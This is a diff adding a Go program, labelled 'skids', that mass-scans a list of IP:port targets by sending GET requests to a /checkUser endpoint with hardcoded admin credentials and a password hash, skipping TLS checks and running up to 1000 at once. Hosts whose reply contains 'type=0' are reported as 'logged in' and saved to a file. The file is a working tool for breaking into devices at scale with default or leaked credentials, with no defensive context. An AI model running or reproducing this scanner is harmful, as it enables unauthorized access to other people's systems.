@@ -1,0 +1,105 @@
+// skids
+
+package main
+
+import (
+	"bufio"
+	"crypto/tls"
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strings"
+	"time"
+)
+
+func main() {
+	// x
+	ipPortFile, err := os.Open("ips.txt")
+	if err != nil {
+		fmt.Println("Error reading ips.txt:", err)
+		return // x
+	}
+	defer ipPortFile.Close()
+
+	scanner := bufio.NewScanner(ipPortFile)
+
+	// x
+	semaphore := make(chan struct{}, 1000)
+
+	// x
+	client := &http.Client{
+		Timeout: 25 * time.Second, // x
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // x
+		},
+	}
+
+	for scanner.Scan() {
+		ipPort := strings.TrimSpace(scanner.Text()) //x
+
+		// x
+		semaphore <- struct{}{}
+
+		go func(ipPort string) {
+			defer func() {
+				// Rx
+				<-semaphore
+			}()
+
+			// x
+			var url string
+			if strings.HasPrefix(ipPort, "https://") {
+				url = fmt.Sprintf("%s/checkUser", ipPort)
+			} else {
+				url = fmt.Sprintf("http://%s/checkUser", ipPort)
+			}
+			params := "?user=admin&password=3376ec73e91ebd975d2affd02b68a262&type=1"
+
+			// Send GET request
+			resp, err := client.Get(url + params)
+			if err != nil {
+				if strings.Contains(err.Error(), "timeout") {
+					return // x
+				} else {
+					return // x
+				}
+			}
+
+			// x
+			body, err := ioutil.ReadAll(resp.Body)
+			resp.Body.Close()
+			if err != nil {
+				return // x
+			}
+
+			// x
+			if strings.Contains(string(body), "type=0") {
+				// x
+				fmt.Printf("[*] logged in: %s\n", ipPort)
+
+				// x
+				outFile, err := os.OpenFile("out.file", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+				if err != nil {
+					return // x
+				}
+				defer outFile.Close()
+
+				_, err = outFile.WriteString(ipPort + "\n")
+				if err != nil {
+					return // x
+				}
+			}
+		}(ipPort)
+	}
+
+	if err := scanner.Err(); err != nil {
+		fmt.Println("Error reading ips.txt:", err)
+		return // x
+	}
+
+	// x
+	for i := 0; i < cap(semaphore); i++ {
+		semaphore <- struct{}{}
+	}
+}
